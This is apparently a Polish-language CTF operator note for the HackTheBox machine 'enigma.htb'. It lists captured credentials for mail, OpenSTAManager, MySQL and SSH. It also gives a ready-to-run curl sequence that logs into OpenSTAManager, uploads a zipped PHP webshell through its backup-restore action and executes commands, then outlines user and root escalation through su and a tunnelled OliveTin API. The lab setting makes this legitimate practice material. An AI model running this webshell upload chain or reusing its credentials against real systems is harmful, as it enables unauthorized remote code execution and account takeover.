# ACCESS — enigma.htb

## Co działa

| Metoda | Tak/Nie | Jak |
|--------|---------|-----|
| SSH | Tak (haris) | klucz `~/.ssh/id_ed25519_htb` lub hasło `bestfriends` (po user flag) |
| Shell | Tak | webshell OpenSTA — patrz niżej |
| GUI | Tak | Roundcube `mail001`, OpenSTA `support_001` |

## Credy (przetestowane)

| Sekret | Do czego | Nie mylić z |
|--------|----------|-------------|
| `kevin:Enigma2024!` | IMAP / Roundcube | SSH (tylko klucz) |
| `sarah:Enigma2024!` | IMAP (mail z credami OSM) | konta systemowe |
| `admin:Ne3s4rtars78s` | OpenSTAManager web | użytkownik Linux `admin` |
| `brollin:Fri3nds@9099` | MySQL `openstamanager` | — |
| `haris:bestfriends` | OSM + `su haris` z www-data | sudo (brak) |

## Replay foothold (RCE)

```bash
# hosts + VPN już up
COOKIE=/tmp/osm-cookie
curl -s -c "$COOKIE" -b "$COOKIE" -H 'Host: support_001.enigma.htb' \
  -X POST 'http://10.129.239.191/?op=login' \
  -d 'username=admin&password=Ne3s4rtars78s' -o /dev/null

echo '<?php system($_GET["c"]); ?>' > /tmp/an.php
zip -q /tmp/evil.zip /tmp/an.php

curl -s -b "$COOKIE" -H 'Host: support_001.enigma.htb' \
  -X POST 'http://10.129.239.191/actions.php?id_module=7' \
  -F 'op=restore' -F 'blob=@/tmp/evil.zip'

curl -s -H 'Host: support_001.enigma.htb' 'http://10.129.239.191/an.php?c=id'
```

**Uwaga:** restore przez `controller.php` też działa; pewniejsze jest `actions.php?id_module=7`.

## User / root

- User: `su haris` z shella (`bestfriends`) → `cat /home/haris/user.txt`
- Root: tunel `ssh -L 13337:127.0.0.1:1337 haris@IP` + OliveTin API (patrz `edu/05-olivetin-privesc.md`)